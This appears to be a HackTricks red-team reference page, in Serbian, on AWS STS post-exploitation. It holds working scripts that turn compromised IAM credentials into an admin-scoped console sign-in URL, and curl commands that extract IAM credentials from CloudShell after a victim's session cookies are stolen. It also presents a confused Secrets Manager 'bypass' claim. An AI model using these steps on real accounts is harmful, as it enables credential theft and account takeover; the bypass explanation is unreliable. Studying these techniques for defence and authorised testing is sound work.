# AWS - STS Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## STS

Za više informacija:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

#### Nova metoda decembar 2024: Zaobići zahtev za link ka web konzoli, putem HTTPS POST zahteva direktno dobiti tajne (bez linka za prijavu ili web konzole)

Poslato juče, kao PR za predstojeći ispit (ARTE: ex16x41) međutim vidim da PR ne prikazuje, možda je pogrešno poslato, hajde da probamo ponovo:
Koristeći ovu metodu potpuno zaobilazite zahtev za otvaranjem bilo kojih URL-ova, formatiranjem bilo kojih linkova za prijavu ili čak korišćenjem CLI / Web konzole.
Šta smo ovde uradili?
Napisao sam ovaj skript koji direktno komunicira sa AWS Secrets Manager API-jem, apsolutno je jednostavan i jasan.
Kada pokrenete skript, šalje HTTPS POST zahtev na AWS Secrets Manager endpoint
https://secretsmanager.<region>.amazonaws.com/
Zahtev GetSecretValue se šalje kao deo POST zahteva, autentifikovan sa SigV4 potpisom (koji upravlja boto3).
Secrets Manager obrađuje zahtev:
AWS validira zahtev prema IAM politikama priloženim vašem korisniku ili ulozi (kao što znamo, možemo videti vrednost tajne samo kao web konzolu)
Ako je dozvoljeno, usluga Secrets Manager vraća traženu vrednost tajne u odgovoru.
**POC Demo:**
CLI AWS komanda za dobijanje vrednosti tajne ne radi jer je pristup odbijen ->
Međutim, na slici možete videti jednostavnost metode da jednostavno izvučete zastavicu direktno znajući ID tajne (to smo enumerisali u ranijoj fazi kada smo se prijavili sa korisničkim profilom)
![image](https://github.com/user-attachments/assets/d05a1a96-04c0-4404-b4bd-dbfa93c6494b)
Napomena: Mislim da se ova metoda može koristiti univerzalno u zavisnosti od scenarija ako politika dozvoljava (ali zaobići ograničenja politike koja ne dozvoljava putem CLI)
Dakle, ovo se može koristiti kad god politika dozvoljava (kao alternativna opcija testiranja)
Pomoćna napomena: radoznao sam o drugim tehnikama koje možete primeniti koristeći istu metodu direktne interakcije sa API-jem usluge i sada AWS CLI, za bilo koji proces privilegovanog eskaliranja ili post eksploatacije kao ovde.
**Kod:**
'''
Python
import boto3

session = boto3.Session(profile_name="lab6")
client = session.client("secretsmanager", region_name="us-east-1")

# Set a custom User-Agent
client.meta.events.register(
'before-call.secretsmanager.GetSecretValue',
lambda params, **kwargs: params['headers'].update({'User-Agent': 'my-custom-tool'})
)

# Retrieve the secret value directly via secretsmanager API
response = client.get_secret_value(SecretId="flag_sts_lab_3")
print(response['SecretString'])
'''

### Od IAM kredencijala do konzole

Ako ste uspeli da dobijete neke IAM kredencijale, možda ćete biti zainteresovani za **pristup web konzoli** koristeći sledeće alate.\
Napomena da korisnik/uloga mora imati dozvolu **`sts:GetFederationToken`**.

#### Prilagođeni skript

Sledeći skript će koristiti podrazumevani profil i podrazumevanu AWS lokaciju (ne vladu i ne cn) da vam da potpisani URL koji možete koristiti za prijavu unutar web konzole:

{% code overflow="wrap" %}
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)



# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
{% endcode %}

#### aws\_consoler

Možete **generisati link za web konzolu** sa [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
Osigurajte da IAM korisnik ima `sts:GetFederationToken` dozvolu, ili obezbedite ulogu za preuzimanje.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) je alat za sigurno čuvanje i pristup AWS akreditivima u razvojnog okruženju.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
Možete takođe koristiti **aws-vault** da dobijete **sesiju konzole pretraživača**
{% endhint %}

#### Od konzole do IAM kredencijala

[**Prvobitno otkriveno u ovom postu**](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/), Ako uspete da kompromitujete neki pristup web konzoli (možda ste ukrali kolačiće i niste mogli da pristupite .aws folderu), možete dobiti neke IAM token kredencijale za tog korisnika putem **CloudShell**.

CloudShell izlaže IAM kredencijale putem **nedokumentovanog krajnjeg tačke na portu 1338**. Nakon učitavanja sesijskih kolačića žrtve u vaš pretraživač, možete se kretati do CloudShell-a i izdati sledeće komande da dobijete IAM kredencijale.
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
